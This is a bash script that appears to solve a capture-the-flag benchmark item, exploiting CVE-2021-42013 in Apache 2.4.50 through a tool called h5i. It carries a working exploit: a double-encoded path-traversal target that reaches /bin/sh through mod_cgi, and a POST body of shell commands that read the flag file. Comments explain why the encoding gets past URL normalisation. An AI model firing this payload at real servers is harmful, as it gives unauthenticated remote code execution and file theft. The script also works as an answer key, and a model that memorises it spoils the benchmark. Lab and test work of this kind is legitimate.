#!/usr/bin/env bash
# XBEN-026-24 — "Deprecated Developers" (tags: cve, path_traversal, lfi)
#
# The server is Apache 2.4.50, which carries CVE-2021-42013: a path-traversal
# that mod_cgi turns into remote code execution. The target of the exploit is a
# request-target the URL standard resolves away before a request exists ---
# `.%%32%65` is `%2e` once decoded and `..` once decoded again, so a URL parser
# straightens `/cgi-bin/.%%32%65/.%%32%65/.../bin/sh` into `/cgi-bin/bin/sh` and
# sends a request the CVE is not about. h5i's ordinary send does exactly that,
# and until `--raw-target` it could only refuse.
#
# `resend --raw-target` writes the request-target on the wire byte for byte,
# around the parser, through the same policy, budget and receipts as any other
# request. With mod_cgi enabled the traversal reaches `/bin/sh` and the POST body
# is its stdin: a two-line shell script that prints a CGI header, a blank line,
# and the flag file.
#
# One practical note: reading the flag *file* directly (a GET at the traversed
# path) returns 500, because Apache tries to run it as a CGI script. The working
# shape is the documented one --- execute `/bin/sh` and have it read the file.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben026-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# `..` four deep escapes /usr/local/apache2/cgi-bin to /, then bin/sh.
TARGET='/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
# The CGI reads this on stdin: a header, the blank line that ends the headers,
# then the flag.
PAYLOAD='echo Content-Type: text/plain; echo; cat /FLAG.txt'

"$H5I" browser open "$URL" --session "$SESSION" --new --capture >/dev/null

SEQ="$("$H5I" browser resend 0 \
    --raw-target "$TARGET" \
    --set method=POST \
    --set "body.raw=$PAYLOAD" \
    --session "$SESSION" --json |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

"$H5I" websec match "res_$SEQ" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
